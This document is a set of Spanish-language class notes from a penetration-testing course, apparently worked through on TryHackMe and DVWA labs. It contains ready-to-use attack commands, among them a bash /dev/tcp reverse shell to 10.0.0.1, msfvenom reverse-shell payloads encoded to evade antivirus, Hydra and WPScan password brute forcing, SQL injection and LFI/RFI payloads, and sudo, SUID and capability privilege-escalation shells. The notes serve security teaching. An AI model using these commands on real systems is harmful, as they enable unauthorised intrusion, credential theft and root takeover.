
# Clase de Hacking

## Clase del 30-10-2024

### Recolección de Información / Reconocimiento
- **Google Dorks**: Técnicas para realizar búsquedas avanzadas en Google y descubrir información específica.
- **Shodan**: Motor de búsqueda para dispositivos conectados a internet.
- **Robtex**: Herramienta de análisis de red y DNS.
- **DNSDumpster**: Herramienta para obtener información de DNS y mapa de red.
- **nslookup**: Comando para consultas de DNS.
- **dig**: Alternativa avanzada a `nslookup` para consultas de DNS.
- **Maltego**: Herramienta de análisis de inteligencia y conexiones entre nodos.
- **The Harvester**: Herramienta para recolectar correos y nombres de dominio.
- **AutoReconTool (Recon-NG)**: Framework de reconocimiento modular que permite realizar tareas de recolección de información avanzada.
- **Censys**: Herramienta para recopilar información de IPs y dominios de forma similar a Robtex.
- **Hunter.io, phonebook.cz, verifyemailaddress.org**: Herramientas en línea para obtener información sobre correos electrónicos y empleados de una organización, útiles en ataques de phishing.
- **PentestGPT (HackerGPT)**: Herramienta de IA que proporciona información sobre ciberseguridad y reconocimiento.
- **Practicas recomendadas**: [TryHackMe - Passive Recon](https://tryhackme.com/room/passiverecon).

### Enumeración / Escaneo
- `ping`: Comando para comprobar la conectividad con un dispositivo en la red.
- `arp-scan`: Escaneo de red para descubrir dispositivos conectados.
- **AutoRecon**: Herramienta de escaneo automático de red y vulnerabilidades.
- **Netdiscover**: Herramienta para descubrir hosts en la red local.
- `nmap -vv -sV -sC -O -p 445`: Escaneo con Nmap para detección de servicios, versiones y sistema operativo en el puerto 445.
- Navegar a los scripts de Nmap:
  ```bash
  cd /usr/share/nmap/scripts
  ```

## Clase del 31-10-2024 - Cómo Evadir un Firewall

### Técnicas de Evasión en Nmap
- **MTU (`--mtu`)**: Ajusta el tamaño de los paquetes enviados para evitar detección, configurando la unidad de transmisión máxima.
- **Data Length (`--data-length`)**: Ajusta manualmente la longitud de los datos para hacerlos lo suficientemente cortos y evitar detección.
- **Source Port (`--source-port`)**: Configura manualmente el puerto de origen para evadir detección, permitiendo seleccionar un puerto específico.
- **Decoy (`-D`)**: Envía paquetes falsos para confundir los sistemas de detección y ocultar actividad real.
- **Fragmented (`-f`)**: Fragmenta los paquetes para evitar que el firewall reconozca el tráfico como escaneo.
- **Spoof-Mac (`--spoof-mac`)**: Cambia la dirección MAC para evitar detección.
- **Stealth Scan (`-sS`)**: Realiza un escaneo SYN que evita establecer una conexión completa, ayudando a evadir detección.
- **Min-Rate (`--min-rate`)**: Controla la velocidad de los paquetes enviados, permitiendo disminuir el ritmo para evadir detección.

#### Comandos de Evasión Populares
- **Top Evasion**:
  - `--source-port`
  - `-D`
  - `--spoof-mac`
  - `-sS`
  - `--min-rate`

#### Ejemplo de Comando Evasivo
```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
nmap -sCV -p80,443,21 <IP>
```

### Ejemplos y Explicaciones
- **Three-Way Handshake**: Secuencia de conexión TCP (SYN, SYN-ACK, ACK).
- **RST**: Señal para finalizar una conexión TCP.

## Clase del 01-11-2024

### Enumeración y Escaneo de SMB y SNMP
- **smbclient**: Similar a `crackmapexec`, permite conectarse a recursos compartidos SMB. Las carpetas con `$` son predefinidas (usadas para gestión y mantenimiento).
- **enum4linux**: Herramienta para enumerar usuarios a través de SMB en el puerto 445.
- **nbtscan**: Lista equipos en la red a través de NetBIOS (puerto TCP 139).
- **snmpwalk**: Lista dispositivos en una red mediante el protocolo SNMP (puertos UDP 161 y 162).
- **arp-scan**: Alternativa a `snmpwalk`, útil para detectar dispositivos en la red sin depender de puertos.
- **Practicas recomendadas**: [Hack The Box - Enumeration Module](https://academy.hackthebox.com/module/details/19).

## Hacking – Post-Explotación

### Herramientas para Post-Explotación
- **WinPEAS**: Para detectar vulnerabilidades en sistemas Windows.
- **LinPEAS**: Similar a WinPEAS, pero para sistemas Linux.
- **Gtfobins**: Herramienta para identificar binarios en sistemas Linux que pueden utilizarse para escalación de privilegios.
- **Lolbas**: Lista de binarios en Windows que pueden usarse en ataques post-explotación.
- **Bashark**: Framework de post-explotación para entornos Linux.
- **Mimikatz**: Herramienta para la extracción de contraseñas y tokens en sistemas Windows.
- **Empire**: Framework de post-explotación y explotación de Windows.
- **Msfvenom**: Herramienta de Metasploit para generar payloads personalizados.

### Herramientas Generales de Post-Explotación
- **Metasploit (msfconsole)**: Framework para explotación y post-explotación de vulnerabilidades.

### Decodificación y Codificación

#### Base64
```bash
echo "Qm9iIC0gIVBAJCRXMHJEITEyMw" | base64 --decode
```
Resultado:
```
Bob - !P@$sW0rD!123
```

### Protocolos y Puertos Importantes
- **LDAP**: Utilizado por Active Directory para comunicación entre equipos.
- **NetBIOS**: Protocolo de Windows para comunicación en red, reemplazado en gran parte por SMB.
- **Protocolo de Escritorio Remoto (RDP)**: Utilizado para acceder y controlar de forma remota equipos Windows en redes locales y a través de internet, generalmente en el puerto 3389.

## Herramientas Resumidas

### Resumen de Comandos y Herramientas
- **Reconocimiento**: Google Dorks, Shodan, Robtex, DNSDumpster, nslookup, dig, Maltego, The Harvester, AutoReconTool (Recon-NG), Censys, Hunter.io, phonebook.cz, verifyemailaddress.org, PentestGPT.
- **Escaneo Básico**: ping, arp-scan, nmap, AutoRecon, Netdiscover.
- **Enumeración y Escaneo de SMB/SNMP**: smbclient, enum4linux, snmpwalk, nbtscan.
- **Evasión de Firewall en Nmap**: Técnicas de ajuste de MTU, Source Port, Decoy, Fragmented, Stealth Scan y otras técnicas.
- **Post-Explotación**: WinPEAS, LinPEAS, Gtfobins, Lolbas, Bashark, Mimikatz, Empire, Msfvenom.
- **Framework General**: Metasploit (msfconsole).
- **Decodificación Base64**: Método para decodificar y codificar en formato base64.

## Clase del 06-11-2024

Continuacion maquina blue

## Clase del 14-11-2024

### Esteganografía y Generación de Payloads con Metasploit

#### **Esteganografía**
- Uso de herramientas en línea para ocultar mensajes o archivos dentro de imágenes:
  - [StegOnline](https://stegonline.georgeom.net/) para analizar y ocultar datos.
  - **Recomendación**: Utilizar formatos como PNG o BMP para obtener mejores resultados.

#### **Creación de Payloads con Metasploit**
- Generación de payloads con `msfvenom` para conexiones reversas:
  - Comando básico para generar un ejecutable malicioso:
    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port> -f exe > reverse.exe
    ```

#### **Uso de Encoders**
- Aplicación de técnicas para evadir antivirus:
  - Comando para agregar un encoder:
    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port> -f exe -e x86/shikata_ga_nai -i 80 > reverse.exe
    ```
    - **`-e`**: Define el encoder (ejemplo: `x86/shikata_ga_nai`).
    - **`-i`**: Número de iteraciones para reencodado (ejemplo: `80`).

#### **Verificación del Payload**
- Escaneo del archivo malicioso en **VirusTotal** para comprobar detección por antivirus.
- Uso de `show encoders` en Metasploit para explorar opciones de codificación.

#### **Búsqueda de Vulnerabilidades Offline**
- Uso de `searchsploit` para buscar exploits sin conexión:
  ```bash
  searchsploit eternalblue

![image](https://github.com/user-attachments/assets/076a4289-f5ed-45c4-9a74-3ace21938308)


## Clase del 18-11-2024

### Hashing y Cifrado: Conceptos y Diferencias

#### **Hashing**
- Proceso unidireccional que convierte datos en una cadena de longitud fija.
- **No reversible**, diseñado para verificar datos, no protegerlos.
- Usos comunes:
  - Almacenamiento seguro de contraseñas.
  - Verificación de integridad de archivos.
- Ejemplos de algoritmos:
  - MD5, SHA-1, SHA-256.

#### **Cifrado**
- Proceso bidireccional que transforma datos para proteger su confidencialidad.
- **Requiere una clave** para cifrar y otra (o la misma) para descifrar.
- Usos comunes:
  - Protección de datos sensibles.
  - Comunicaciones seguras.
- Ejemplos de algoritmos:
  - AES, RSA, DES.

#### **Diferencias clave**
| Aspecto          | Hashing              | Cifrado               |
|------------------|----------------------|-----------------------|
| Proceso          | Unidireccional       | Bidireccional         |
| Reversibilidad   | No reversible        | Reversible            |
| Propósito        | Verificación         | Confidencialidad      |
| Clave requerida  | No                   | Sí                    |

---

### Cracking de Contraseñas

#### Métodos de Cracking
1. **Fuerza Bruta**
   - Intenta todas las combinaciones posibles.
   - **Ventaja**: Garantiza éxito si es posible.
   - **Desventaja**: Muy lento y consume muchos recursos.
   - Ejemplo de herramienta: `John the Ripper`.

2. **Ataque con Diccionarios**
   - Utiliza listas predefinidas de palabras o combinaciones comunes.
   - **Ventaja**: Más rápido que fuerza bruta.
   - **Desventaja**: Limitado a las entradas disponibles en el diccionario.
   - Ejemplo de herramienta: `hashcat`.

#### Ejemplo: Uso de Diccionario con Hashcat
```bash
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```
- **`-m`**: Especifica el tipo de hash (e.g., `0` para MD5).
- **`-a`**: Modo de ataque (`0` para diccionario).

---

### Diccionarios: Tipos y Fuentes

#### **Tipos de Diccionarios**
- **Contraseñas comunes**: Contienen palabras y frases populares utilizadas frecuentemente.
- **Específicos de idioma**: Adaptados a patrones lingüísticos de diferentes regiones.
- **Temáticos**: Enfocados en un tema específico (e.g., deportes, tecnología, cultura).

#### **Dónde Encontrar Diccionarios**
1. **Kali Linux**:
   - Ruta predeterminada:
     ```bash
     /usr/share/wordlists/
     ```
   - Ejemplo: `rockyou.txt`.
   - Comandos para acceder:
     ```bash
     cd /usr/share/wordlists
     ls -la
     ```
   - Para descomprimir `rockyou.txt`:
     ```bash
     sudo gunzip /usr/share/wordlists/rockyou.txt.gz
     ```

2. **Internet**:
   - Repositorios públicos como GitHub.
   - **SecLists**: Amplia colección organizada por categorías (contraseñas, nombres de usuario, directorios, etc.).
     - Enlace: [SecLists - Daniel Miessler](https://github.com/danielmiessler/SecLists).
     - Versiones recomendadas:
       - **Small**: Más ágil y ligera.
       - **Complete**: Mayor cobertura, más completa.

3. **Darknet**:
   - Mercados y foros para diccionarios personalizados.
   - **Advertencia**: Riesgo de contenido ilegal o malicioso.

> 💡 **Consejo:** Organiza tus diccionarios en carpetas temáticas y utiliza los más adecuados según el contexto del ataque.

---

### Herramientas Populares para Cracking

- **John the Ripper**: Versátil y compatible con múltiples formatos de hash.
- **Hashcat**: Potente y optimizado para GPUs, ideal para tareas complejas.
- **Hydra**: Especializado en ataques dirigidos a servicios como SSH, HTTP, FTP, entre otros.



# Clase del 25-11-2024

## John the Ripper: The Basics

Los comandos básicos y esenciales de **John the Ripper** fueron explorados durante esta sesión, especialmente en la room de TryHackMe. Este archivo se centra en algunos comandos relevantes de **Nmap** que se vieron durante la clase.

### Comandos de Nmap

A continuación, se listan los comandos de **Nmap** utilizados para explorar servicios específicos en hosts remotos:

#### 1. Escaneo detallado de servicios abiertos
```bash
nmap -vv -sV --open [IP]
```
- **-vv**: Incrementa el nivel de detalle (verbose) para proporcionar más información durante el escaneo.
- **-sV**: Detecta versiones de los servicios en los puertos abiertos.
- **--open**: Solo muestra los puertos que están abiertos.

#### 2. Escaneo enfocado en SSH
```bash
nmap -vv -sV --script=ssh* -p22 [IP]
```
- **--script=ssh***: Ejecuta scripts específicos relacionados con SSH.
- **-p22**: Escanea únicamente el puerto 22, que es el puerto estándar para SSH.

#### 3. Escaneo enfocado en FTP
```bash
nmap -vv -sV --script=ftp-anon.nse -p21 [IP]
```
- **--script=ftp-anon.nse**: Utiliza el script `ftp-anon.nse` para verificar si el servidor FTP permite acceso anónimo.
- **-p21**: Escanea únicamente el puerto 21, estándar para FTP.

### Notas Adicionales
Estos comandos son muy útiles para obtener información detallada sobre servicios específicos, identificar posibles vulnerabilidades y realizar un análisis inicial en un entorno de pruebas. 

Por ejemplo:
- El escaneo con el script `ftp-anon.nse` puede revelar si un servidor FTP permite acceso anónimo, lo cual podría ser una vulnerabilidad a explotar.
- El uso del comodín `ssh*` permite ejecutar múltiples scripts relacionados con SSH para obtener más información.

---

Esta documentación sirve como referencia para los ejercicios prácticos realizados en la clase y puede ampliarse según los resultados obtenidos al usar estos comandos.

# Clase del 28-11-2024

Vemos la room de tryhackme de hydra

Para certificaciones mirar el video de esta fecha


# Clase del 02-12-2024: Room TryHackMe - Blog

## 1. Escaneo Básico con Nmap
Comando para identificar servicios y versiones en una máquina:
```bash
nmap -vv -sV [ip]
```

## 2. Modificación del Archivo Hosts
Algunas máquinas de TryHackMe no tienen DNS asociado. Es necesario modificar el archivo `/etc/hosts` para asignar nombres personalizados a las IPs.

- Editar el archivo:
```bash
sudo nano /etc/hosts
```
- Ejemplo dentro del archivo:
```plaintext
10.10.10.10    blog.thm
```
> **Nota:** Asigna nombres adecuados basados en resultados de `nmap` o llamadas frecuentes como `http://blog.thm`.

---

## 3. Análisis de Tecnologías Web

### Wappalyzer
Extensión de navegador para detectar versiones y tecnologías usadas por una web.

### WhatWeb
Herramienta de CLI para analizar tecnologías.
- Manual de uso:
```bash
man whatweb
```

---

## 4. Búsqueda de Enlaces con LinkFinder
Script que busca enlaces dentro del código fuente:
- Repositorio:
[LinkFinder - GitHub](https://github.com/GerbenJavado/LinkFinder)

---

## 5. Escaneo SSL
Para webs HTTPS:
```bash
sslscan [url]
```

---

## 6. Escaneo de Vulnerabilidades Web

### Nikto
Escáner básico, aunque no es el más recomendado:
```bash
nikto -h [http://url]
```

### Curl
Para interactuar y probar manualmente HTTP:
```bash
curl -I [url]  # Ver cabeceras
```

### Métodos HTTP con Nmap
Ver los métodos permitidos en el servidor:
```bash
nmap -vv --script http-methods [url]
```

---

## 7. Fuzzing de Directorios

### Gobuster
Comando para buscar directorios y archivos:
```bash
gobuster dir --url http://blog.thm/ --wordlist /usr/share/wordlists/dirb/big.txt
```

### Dirsearch
Escaneo más avanzado con opciones adicionales:
```bash
sudo dirsearch -u http://blog.thm/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php,txt,html -f
```
> **Nota:**  
- `-u`: URL  
- `-w`: Wordlist  
- `-e`: Extensiones a buscar (php, txt, html)  
- `-f`: Fuerza el escaneo de archivos incluso si no hay respuesta 403.  
- `-t`: Número de hilos (paralelismo).

---

## 8. Escaneo de WordPress
Usar **WPScan** exclusivamente en sitios WordPress:
```bash
wpscan --url http://blog.thm
```

---

## Recomendación del Profesor:
Crea una **Tool Sheet** con todas las herramientas que uses, sus comandos y explicaciones breves para facilitar el estudio.

---

# Notas de la Clase (09-12-2024)

## Instalación de ZAP Proxy en Kali

```bash
sudo apt install zaproxy
```

Aunque usamos ZAP Proxy, trabajaremos principalmente con **Burp Suite**.

- **Recomendación:** Obtener la certificación de Burp Suite para destacar profesionalmente.
- **Certificaciones relacionadas:**
  - Security+ (recomendada por el profesor)
  - CySA+ (el profesor no tiene mucha información sobre esta).

---

## Burp Suite: Introducción

Burp Suite actúa como un proxy que intercepta y analiza el tráfico hacia la máquina objetivo.

### Pasos para empezar a usar Burp Suite

1. **Abrir las configuraciones del proxy:**
   - Ir a `Proxy` > `Proxy Settings`.
2. **Instalar FoxyProxy en el navegador.**
   - Configurar FoxyProxy con la IP y puerto de Burp Suite desde `Options`.
3. **Definir un scope en Burp Suite.**
   - [Ejemplo visual](https://github.com/user-attachments/assets/7bf5e699-d736-4d0f-a20c-27d2c2313fab)
4. **Descargar el certificado de Burp Suite:**
   - Agregarlo a los ajustes del navegador.
5. **Consultar la guía del profesor sobre Burp Suite.**
6. **Explorar y "jugar" con Burp Suite para aprender sus funcionalidades.**

---

## Room: Blog (TryHackMe)

Para realizar un ataque de fuerza bruta en una web, las herramientas recomendadas son:

1. **Hydra**
2. **Burp Suite**
3. **WPScan** (especialmente para WordPress)

### Comandos utilizados

- **Comando 1:** Buscar vulnerabilidades

  ```bash
  wpscan --url http://blog.thm
  ```

- **Comando 2:** Enumerar usuarios

  ```bash
  wpscan --url http://blog.thm -e u
  ```

- **Comando 3:** Fuerza bruta para WordPress

  ```bash
  wpscan --url http://blog.thm/wp-login.php --usernames bjoel --passwords /usr/share/wordlists/rockyou.txt --max-threads 5
  ```
  > **Nota:** El parámetro `--max-threads` no es obligatorio en este caso.

- Una vez encontrada la contraseña, acceder al panel de login de WordPress.

---

## Room: DVWA (Damn Vulnerable Web Application)

1. **Definir el scope:**
   - Configurar la IP de la máquina objetivo en Burp Suite.

2. **Escaneo inicial con Nmap:**

   ```bash
   nmap -vv -sV [IP]
   ```

3. **Acceso a la web:**
   - Entrar a la dirección IP de la máquina objetivo y configurar el nivel de seguridad en **"Bajo"** por el momento.

4. **Forzar errores:**
   - Generar un error en la web para que Burp Suite intercepte las respuestas. Esto permitirá capturar las solicitudes (requests) y respuestas (responses) necesarias.

5. **Enviar la request a Intruder:**
   - Configurar el ataque en Intruder.
   - Los métodos más comunes son:
     - **Sniper**
     - **Cluster Bomb** (utilizaremos este).

6. **Configurar Cluster Bomb:**
   - Atacar tanto usuario como contraseña.
   - Seleccionar y añadir los parámetros correspondientes.

---


# Notas de la Clase (12-12-2024)

## Room DVWA: Ataques con Burp Suite para Fuerza Bruta

### Pasos a seguir

1. Introducir credenciales incorrectas para generar el mensaje de error.
   - Esto permite que Burp Suite continúe y no se detenga al encontrar el mensaje de error.
2. En Burp Suite, llevar el código del mensaje de error al Intruder.
   - Agregar los campos de usuario y contraseña marcándolos con `Add`.
   - Seleccionar el método **Cluster Bomb** para atacar ambos campos.
3. Añadir un diccionario de contraseñas manualmente (como `rockyou.txt` o similar).
4. En la pestaña **Settings** del Intruder, ir a `grep - extract` y agregar el mensaje de error.
5. Ejecutar el ataque y analizar los resultados para identificar las combinaciones de usuario y contraseña válidas.

---

## Ataques con Hydra y Burp Suite

### Pasos a seguir

1. Provocar un error mientras inspeccionamos la página.
2. Usar el siguiente comando para realizar un ataque con Hydra:

   ```bash
   hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=rt5o26sooph0v8p5nuarofj346"
   ```
   > **Nota:** Si no funciona, actualizar la cookie.

---

## Ataques de Command Injection

### Descripción

- Se puede inyectar comandos usando `&` o `|` si la aplicación no está correctamente asegurada.

### Explotación

1. Preparar una reverse shell:

   - En nuestra terminal:

     ```bash
     nc -lvp 8080
     ```

   - En la máquina víctima:

     ```bash
     bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
     ```

2. Alternativamente, utilizar otras opciones disponibles en la [cheat sheet de reverse shells](https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/).

---

## Ataques de CSRF (Cross-Site Request Forgery)

### Consideraciones

- Este ataque solo es posible si existe una vulnerabilidad CSRF.
- Común en aplicaciones con métodos **HTTP GET**.

### Explotación

1. Iniciar sesión en la aplicación.
2. Copiar la URL que realiza el cambio de contraseña y modificarla para establecer una contraseña conocida:

   ```
   http://10.10.137.205/vulnerabilities/csrf/?password_new=1234&password_conf=1234&Change=Change#
   ```

3. Acortar el enlace y distribuirlo según sea necesario.

### Alternativa con Burp Suite

1. Realizar el cambio de contraseña desde la aplicación.
2. Interceptar la solicitud en Burp Suite.
3. Modificar la solicitud desde Burp Suite antes de enviarla, estableciendo una contraseña personalizada.

---


# Notas de la Clase (16-12-2024)

## Ataques de File Inclusion (LFI y RFI)

### LFI (Local File Inclusion)

1. **Ubicación de directorios web:**
   - **Windows:** `C:\inetpub\wwwroot\`
   - **Linux:** `/var/www/`
2. Si no está correctamente configurado, al abrir un archivo desde la URL se puede realizar una inclusión de archivos locales. Ejemplo:

   ```
   http://10.10.180.63/vulnerabilities/fi/?page=../../../../../etc/passwd/
   ```
   - Esto permite explorar directorios y visualizar archivos.

3. Solo se pueden acceder a los archivos permitidos por el usuario `www-data` (usuario creado al instalar la web).
4. Para avanzar hacia un RCE (Remote Code Execution), seguir los pasos indicados en [este tutorial](https://ironhackers.es/tutoriales/lfi-to-rce-envenenando-ssh-y-apache-logs/) utilizando Burp Suite.

---

### RFI (Remote File Inclusion)

1. **Ubicación de directorios web:**
   - **Windows:** `C:\inetpub\wwwroot\`
   - **Linux:** `/var/www/`
2. Si no está correctamente configurado, se puede incluir archivos remotos. Ejemplo:

   ```
   http://10.10.180.63/vulnerabilities/fi/?page=url
   ```

3. Crear un servidor HTTP en la carpeta donde tengas los scripts. Por ejemplo, en:

   ```bash
   cd /home/kali/Downloads/
   python -m http.server 8080
   ```

4. En la URL del paso anterior, incluir el servidor HTTP creado con Python. 
   - Como auditor, puedes cargar un script para obtener acceso en lugar de un exploit malicioso.

5. Buscar una reverse shell en PHP, copiar el código o descargarlo.
   - Crear un archivo `.php` y modificar los parámetros necesarios.

6. Dar permisos de ejecución al archivo si es necesario.
7. Abrir el puerto configurado en el archivo con:

   ```bash
   nc -lvnp [puerto]
   ```

8. Ejecutar el script desde la URL para establecer la conexión.

**Resultado:** Ambos modos (LFI y RFI) pueden derivar en un RCE o una reverse shell.

---

## File Upload

### File Upload Low

1. Subir un archivo a la aplicación.
2. Dependiendo de la configuración de seguridad, puede mostrarse la URL donde se guardó el archivo.
3. Copiar esa ruta y modificarla en la URL para explorar toda la estructura de archivos.
4. Subir otro script como en los casos de LFI o RFI para obtener acceso adicional.

### File Upload Medio

1. Configurar Burp Suite y activar el intercept.
2. Subir el archivo deseado.
3. Mientras el archivo está en espera, modificar su extensión (por ejemplo, cambiar de `.php` al formato requerido y luego devolverlo a `.php`).
4. Enviar la solicitud modificada con `Forward` para completar el proceso y subir el archivo a la web.

### File Upload High

1. *(Falta completar detalles en esta sección)*

---

## SQL Injection

### SQL Injection Low

1. Realizar una búsqueda introduciendo una comilla simple (`'`).
   - Si se genera un error, indica que hay vulnerabilidad de SQL Injection.
2. Probar payloads como:

   ```sql
   ' OR '1'='1
   OR 1=1 --
   ```

3. Usar herramientas como **sqlmap** para automatizar el ataque:

   ```bash
   sqlmap -u "http://[url]/vulnerable-page" --dbs
   ```

---


# Notas de la Clase (19-12-2024)

## Instalación de Tor

```bash
sudo apt update 
sudo apt install tor 
sudo apt install tor torbrowser-launcher -y
```

## Arrancar y comprobar el servicio de Tor

```bash
sudo service tor start 
sudo service tor status
```

## Configuración de Proxychains
Para dirigir el tráfico a través de Tor y evitar que nuestra IP real sea conocida:

1. Editar el archivo de configuración de Proxychains:

   ```bash
   sudo nano /etc/proxychains.conf
   ```

2. Realizar los siguientes cambios:

   - Borrar el símbolo `#` de la línea `#dynamic_chain`
   - Comentar con un `#` la línea `strict_chain`
   - Añadir al final del archivo:
     ```
     socks5 127.0.0.1 9050
     ```

3. Reiniciar el equipo:

   ```bash
   sudo reboot
   ```

## Uso de Proxychains para anonimato
Para garantizar el anonimato al realizar acciones:

```bash
sudo proxychains nmap -vv -sT -Pn -n -sV -O <IP>
sudo proxychains dirb <HOST> <WORDLISTS>
sudo proxychains firefox https://www.upgradehub.com/
sudo proxychains nikto -h <HOST>
```

### Recomendaciones adicionales

- **Abrir todo desde Proxychains**: Para garantizar el uso del anonimato.
- **Uso de VPN antes de Tor**: Añadir una VPN antes de utilizar Tor para mayor privacidad.
- **Cambiar el DNS**: Evitar que el DNS deje rastros de tu router. Configuración en Firefox:
  
  1. Acceder a `about:config` en la barra de direcciones.
  2. Buscar `media.peerconnection.enabled`.
  3. Cambiar su valor a `off`.


# Notas de la Clase (16-01-2025)

## Linux Privilege Escalation (TryHackMe)

### Enumeración para Escalación

1. **Credenciales de usuario:** 
   - Tenemos `user` y `pass`.
   - Accedemos mediante `ssh`.

2. **Comandos básicos de enumeración:**
   ```bash
   hostname
   whoami
   uname -a
   cat /proc/version
   sudo -l
   cat /etc/passwd
   history
   ifconfig
   netstat -tuln -tnp -an
   pwd
   env
   id
   cat /etc/crontab
   ls -la
   systemctl list-timers
   ```

3. **Herramientas adicionales:**
   - `Pspy`: Monitorear procesos en ejecución.
   - Buscar binarios SUID:
     ```bash
     find / -perm -u=s -type f 2>/dev/null
     ```
   - Buscar capacidades:
     ```bash
     getcap -r / 2>/dev/null
     ```

### Enumeración Automática

- Descargamos [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS).
- Configuramos un servidor Python para transferir archivos:
  ```bash
  python3 -m http.server 8080
  ```
- En la máquina atacada:
  ```bash
  wget http://<IP>:8080/linpeas.sh
  chmod +x linpeas.sh
  ./linpeas.sh
  ```
- Identificamos vulnerabilidades (CVE) como:
  - **DirtyCow**
  - **OverlayFS**

---

## Kernel Exploits

1. Verificamos la versión del kernel en la máquina atacada:
   ```bash
   lsb_release -a
   ```
   - Ejemplo: `Ubuntu 14.04`.

2. Usamos `searchsploit` para buscar exploits:
   ```bash
   searchsploit 3.13.0
   ```
   - Descargamos el exploit: `37292.c`.

3. Configuramos un servidor Python para transferir el exploit a la máquina atacada.

4. Compilamos el exploit:
   ```bash
   gcc 37292.c -o privesc
   ```

5. Ejecutamos el exploit:
   ```bash
   ./privesc
   ```
   - Resultado: Acceso root.

---

## Sudo Exploitation

1. Conectamos nuevamente por `ssh` y configuramos una shell interactiva:
   ```bash
   bash
   ```

2. Transferimos `linpeas.sh` usando un servidor Python y configuramos permisos:
   ```bash
   chmod +x linpeas.sh
   ```

3. Verificamos permisos de sudo:
   ```bash
   sudo -l
   ```

4. Consultamos [GTFOBins](https://gtfobins.github.io/) para identificar comandos vulnerables.
   - Ejemplo del profesor:
     ```bash
     sudo find . -exec /bin/sh \; -quit
     ```

---

## SUID Exploitation

1. Accedemos mediante `ssh` y recopilamos información:
   ```bash
   uname -a
   ```

2. Verificamos binarios con permisos SUID:
   ```bash
   find / -perm -u=s -type f 2>/dev/null
   ```

3. Consultamos la página de GTFOBins para identificar comandos SUID vulnerables.
   - En el caso del ejercicio: `base64`.
   - Ejecutamos los comandos sugeridos en GTFOBins para aprovechar la vulnerabilidad.

---

# Notas de la Clase (20-01-2025)

## Escalación de Privilegios con Sudo

### Comando Básico
Para escalar privilegios con `sudo`, puedes ejecutar el siguiente comando:
```bash
sudo find . -exec /bin/sh \; -quit
```
Esto te otorgará acceso como root.

### Diferencias entre `sudo` y `SUID`
Es fundamental comprender las diferencias entre `sudo` (permite ejecutar comandos con privilegios elevados temporalmente) y los permisos `SUID` (que ejecutan binarios con los privilegios del propietario).

### Configuración de SUID
Puedes asignar un permiso SUID a un archivo con:
```bash
chmod 4755 /usr/bin/python3
```

### Búsqueda de Archivos con Permisos SUID
Para localizar archivos con permisos SUID en el sistema:
```bash
find / -perm -u=s -type f 2>/dev/null
```

### Escalación con Python3
Si encuentras un archivo SUID asociado a Python3, puedes escalar privilegios ejecutando:
```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

---

## Cron Jobs

### Análisis Inicial
Comienza obteniendo información del sistema:
```bash
uname -a
```
También puedes usar herramientas como `linpeas` para automatizar el proceso de análisis.

### Identificar Tareas Programadas
Localiza las tareas programadas revisando el archivo `/etc/crontab`:
```bash
cat /etc/crontab
```

### Caso Práctico
En este ejemplo, encontramos una tarea programada (cron job) que ejecuta un archivo de respaldo de un usuario (por ejemplo, `karen`). Si este archivo es editable por el usuario actual, podemos modificarlo para incluir una reverse shell o cualquier otro payload malicioso. Una vez hecho esto, solo hay que esperar a que el cron job se ejecute automáticamente con privilegios elevados.

---

## Escalación de Privilegios con Capabilities

### Comandos Iniciales
Comienza analizando el sistema:
```bash
uname -a
sudo -l
```

Busca binarios con permisos SUID:
```bash
find / -perm -u=s -type f 2>/dev/null
```

Si encuentras una vulnerabilidad utilizando `find`, puedes explotarla con:
```bash
sudo find . -exec /bin/sh \; -quit
```

### Configuración de Capabilities
Asigna la capability `cap_setuid` al binario de Python3 (o su versión instalada):
```bash
setcap cap_setuid+ep /usr/bin/python3
```

### Verificar Capabilities
Para buscar capabilities configuradas:
```bash
getcap -r / 2>/dev/null
```

### Escalación con Python3
Ejecuta el siguiente comando para escalar privilegios:
```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

---

## Nota Final
Revisa los últimos 30 minutos de la clase para consolidar conceptos clave. Asegúrate de practicar cada uno de estos métodos en un entorno controlado y ético.

# Notas de la Clase (23-01-2025)

### Tema 7 - Local Users vs Domain Users
- **Usuarios locales:** Creados y gestionados en la máquina local.
- **Usuarios de dominio:** Gestionados en un servidor de dominio (Active Directory).

---

## Enumeración

### Enumeración Manual
- **Comandos útiles:**
  - `hostname` - Nombre del host.
  - `whoami` - Nombre del usuario actual.
  - `whoami /priv` - Privilegios del usuario actual.
  - `systeminfo` - Información del sistema.
  - `ipconfig` - Configuración de red.
  - `cmdkey /list` - Credenciales almacenadas.
  - `icacls <ruta>` - Permisos sobre un archivo/carpeta.
  - `sc query windefend` - Estado de un servicio.
  - `schtasks /query /fo LIST /v` - Tareas programadas.
  - `reg /query` - Consulta del registro.

### Enumeración Automática
- **Herramientas recomendadas:**
  - **WinPEAS:** [Windows 10 Privilege Escalation](https://tryhackme.com/room/windows10privesc)
  - **Windows Exploit Suggester:** [Windows Privilege Escalation 2.0](https://tryhackme.com/room/windowsprivesc20) (Task 8).
  - **PowerUP:** Herramienta de PowerShell para identificar vulnerabilidades.
  - **BeRoot.exe:** Detección de configuraciones inseguras.
  - **SeatBelt.exe:** Auditoría de configuraciones de seguridad en Windows.

---

## Técnicas de Post-Explotación

### Insecure Service Permissions
- **Descripción:** Permisos inseguros en servicios permiten la escalada de privilegios.
- **Ejemplo:** [Task 3 - Windows Privilege Escalation](https://tryhackme.com/room/windows10privesc).

### Unquoted Service Path
- **Descripción:** Una ruta de servicio sin comillas puede ejecutarse de forma maliciosa.
- **Ejemplo:** [Task 4 - Windows Privilege Escalation](https://tryhackme.com/room/windows10privesc).

### Insecure Service Executable
- **Descripción:** Archivos ejecutables de servicio inseguros pueden ser reemplazados.
- **Ejemplo:** [Task 6 - Windows Privilege Escalation](https://tryhackme.com/room/windows10privesc).

### Passwords Saved Creds
- **Descripción:** Recuperación de contraseñas guardadas en el sistema.
